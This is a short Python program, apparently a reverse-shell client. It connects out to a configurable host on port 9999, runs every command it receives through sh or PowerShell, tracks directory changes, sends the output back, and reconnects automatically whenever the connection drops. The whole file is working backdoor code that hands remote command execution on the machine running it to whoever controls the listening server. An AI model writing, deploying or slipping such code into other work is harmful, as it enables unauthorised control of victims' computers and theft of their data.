import socket
import time
import subprocess
import os
import platform

END_MARKER = "<END_OF_OUTPUT>"
CURRENT_DIR = os.getcwd()
IS_WINDOWS = platform.system() == "Windows"
HOST = ""
PORT = 9999

def run_in_shell(command, cwd):
    if IS_WINDOWS:
        cmd = ["powershell.exe", "-NoProfile", "-Command", command]
    else:
        cmd = ["/bin/sh", "-lc", command]
    return subprocess.run(cmd, capture_output=True, text=True, cwd=cwd)

def server_connect():
    s = socket.socket()
    s.connect((HOST, PORT))
    return s

def execute_command(s, command):
    global CURRENT_DIR

    stripped = command.strip()
    if stripped == "":
        s.sendall((END_MARKER).encode())
        return
    
    if stripped == "cd" or stripped.startswith("cd "):
        target = stripped[2:].strip() or os.path.expanduser("~")
        target = os.path.expandvars(os.path.expanduser(target))
        if not os.path.isabs(target):
            target = os.path.normpath(os.path.join(CURRENT_DIR, target))
        try:
            if os.path.isdir(target):
                CURRENT_DIR = target
                s.sendall((f"Changed directory to: {CURRENT_DIR}\n"+END_MARKER).encode())
            else:
                s.sendall((f"cd: no such directory: {target}\n"+END_MARKER).encode())
        except Exception as e:
            s.sendall((f"cd: {e}\n"+END_MARKER).encode())
        return
    print("Executing:", repr(command))
    result = run_in_shell(command, CURRENT_DIR)
    output = result.stdout if result.stdout else result.stderr
    if not output:
        output = "\n"
    s.sendall((output + END_MARKER).encode())

s = server_connect()

while True:
    try:
        msg = s.recv(4096)
        command = msg.decode("utf-8")
        execute_command(s, command)
    except socket.error as error_msg:
        print("An Unexpected Connection Error Occured: " + str(error_msg))
        time.sleep(5)
        s = server_connect()

